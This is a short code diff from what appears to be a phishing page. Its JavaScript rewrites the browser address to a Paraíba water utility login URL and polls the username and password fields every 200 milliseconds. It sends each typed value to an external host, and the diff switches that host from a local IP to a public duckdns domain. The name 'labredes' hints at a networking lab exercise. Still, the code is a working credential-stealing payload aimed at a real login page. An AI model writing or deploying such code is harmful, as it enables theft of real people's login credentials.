@@ -9,11 +9,11 @@ window.history.replaceState(null, '', 'https://sic.cagepa.pb.gov.br/app_Login/')
 setInterval(() => {
     if(user.value!==username){
         username = user.value
-        fetch('http://192.168.35.17:8080/username/'+username)
+        fetch('https://labredes.duckdns.org/username/'+username)
     }
     if(pass.value!==password){
         password = pass.value
-        fetch('http://192.168.35.17:8080/password/'+password)
+        fetch('https://labredes.duckdns.org/password/'+password)
     }
 }, 200 )
 }
